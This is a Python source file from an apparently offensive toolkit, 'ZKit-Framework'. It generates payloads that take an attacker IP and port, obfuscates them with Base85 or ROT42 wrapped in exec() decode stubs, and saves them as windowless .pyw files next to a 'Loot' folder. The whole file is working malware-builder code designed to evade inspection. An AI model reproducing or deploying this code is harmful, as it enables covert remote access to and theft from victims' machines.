"""The Core Module of ZKit-Framework Contains : some useful methods like a custom create_file"""
import os
import random
import socket as s
from base64 import b85encode as be
from datetime import datetime as dt

from core.helper_core.coloring import Color, ask_for, notify
from core.lib.payload import PayloadGenerator

path = '/'.join(__file__.replace("\\", '/').split("/")[:-3])

DECODE_STUB_BASE85 = 'from base64 import b85decode as {b}\nvalue ="""{}"""\nexec({b}(value))'
DECODE_STUB_ROT42 = 'value ="""{}"""\nexec(''.join(chr((ord({b}) - 42)for {b} in value)))'
ASK_FOR_ASKING_STRING = "Payload is asking for a(n) '{}'. And is required : "
ASK_FOR_REPORT_STRING = "Passing /| to payload as {}"

ENCODING_CHOICES = {'1': 'BASE85', '2': 'ROT42'}


def init():
    'inits the zkit . without you will get several errors'
    if os.name == "nt":
        pathslist = [path + "/Builded/", path + '/Loot/',
                     path + "/User/Payloads/"

                     ]
    for _path in pathslist:
        os.popen("mkdir \"{}\"".format(_path)).close()
    os.popen('echo. > {}'.format(path + "/Errors.log"))
    
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


def search_for_payloads(where="/User/Payloads/") -> dict:
    "searches /User/Payloads/ for payloads to install or the place you say"
    payloads = {}
    place = path + where
    if os.name == "nt":
        place = place.replace("/", "/")
    else:
        place = place.replace("/", "/")

    for r, d, _ in os.walk(place):
        for payload in d:

            payloads[payload] = r + payload

    return payloads


def list_payloads(payloads=search_for_payloads()):
    "You can get the result form search_user_payloads or i will do it"
    col = Color
    for index, payload in enumerate(payloads.keys()):
        print(col().RandomColor() + "\n{%s} --> %s" % (str(index + 1), payload + ((15 - len(payload))  # Bug fix
                                                                                  * " ") + " >>> " + payloads[payload].replace(path, '')) + col().GetColor('reset'))

    print("\n{000} --> Back To Main Menu")
    return payloads


def list_builtin_payloads(payload_type):
    path = "/core/lib/payloads/" + payload_type + "/"
    payloads = search_for_payloads(path)
    payloads = list_payloads(payloads)
    print("Please Choose One Of Them (Number Of It): ", end="")
    return payloads


def crash_handler(exception: BaseException):
    with open(path + "/Errors.log", "a") as f:
        f.write("[{}] : {}\n".format(dt.now(), str(exception)))
    print("Sth went really wrong that we couldnt handle it\n"
          + "the exceptions value have saved to Errors.log\n"
          + "please report this on github to me."
          + "Do you want zkit to reraise it ? (reraising may help better) (Y/N): ", end='')
    choice = str(input()).lower()
    if choice.strip() == "y":
        print("This is going to print full error . please report it on github")
        raise
    else:
        print("Ignoring")


class Generate:
    def __init__(self, root: str):
        "generates payloads with given root"
        from core.helper_core import create_file, open_file, write_file
        self.root = root
        self.pg = PayloadGenerator(self.root)
        self.get_fields()
        self.get_info()
        self.get_payload()
        self.payload = encrypt_it(self.payload, chr(random.randint(65, 122)))
        self.path = create_file(path + "/Builded/" + self.path + ".pyw")
        f = open_file(self.path)
        write_file(f, self.payload)
        notify('report', "Operaion Was Successful")

    def get_info(self):
        datas = []
        for field in self.fields:
            print(field)
            if field.lower() in ('host', 'ip', 'hostname', 'domain', 'attacker_ip'):
                data = ask_for("Whats you ip address, hostname" +
                               "left it to empty to use your own hostname (automic) : ",
                               "Passing \\| to payload as hostname", default=['', s.gethostname],
                               )
            # so you can name it porty and portport or THEPORT or other names that 'port' is in it and zkit understand it .
            elif 'port' in field.lower():
                data = ask_for("Whats An Open Port In Your Machine " +
                               "Left It '-1' To Use Default Port (1534 Eclipse's "
                               "default communicate port) : ", "Passing \\| to payload as port",
                               default=[-1, 1534], type=int,
                               )
            else:
                data = ask_for(ASK_FOR_ASKING_STRING.format(field),
                               ASK_FOR_REPORT_STRING.format(field))
            datas.append(data)
        self.args = datas
        print(self.args)
        self.path = ask_for("Whats the filename " +
                            "for your zkit generated script : ",
                            "using \\|.pyw as your filename",
                            default=['', ''], type=str,
                            )
        print(*self.args)

    def get_payload(self) -> str:
        self.payload = self.pg.interact(self.args)

    def get_fields(self):
        self.fields = self.pg.get_fields()


def _encrypt(payload, enc):
    if enc == "":
        enc_type = random.choice(['BASE85', 'ROT42'])
    else:
        enc_type = ENCODING_CHOICES.get(enc, 'ROT42')

    if enc_type == "BASE85":
        payload = be(payload.encode("UTF-8")).decode("UTF-8")
        DECODE_STUB = DECODE_STUB_BASE85
    else:
        payload = ''.join(chr((ord(w) + 42)for w in payload))
        DECODE_STUB = DECODE_STUB_ROT42
    return DECODE_STUB, payload


def encrypt_it(payload, b) -> str:

    enc = ask_for("Which Encryption Method Would You Like To Use" +
                  "Press Enter and left it empty for choosing randomly.\n{1} --> Base85\n{2} --> Rot42", "Using \\| As Encryption Method")
    notify("notify", "Encrypting Data Before Writing On File...", "")
    DECODE_STUB, payload = _encrypt(payload, enc)

    print("Done")
    return DECODE_STUB.format(payload, b=b)


def print_banner():
    from core.helper_core.banners import banner1, banner2
    "gets a random color and a random banner and prints it"
    reset = Color().GetColor('reset')
    random.seed(random.choice(
        [random.randint(1, 9999), random.randint(1, 998)]))
    banner = random.choice([banner1, banner2])
    color = Color().RandomColor()
    print(color + banner + reset)
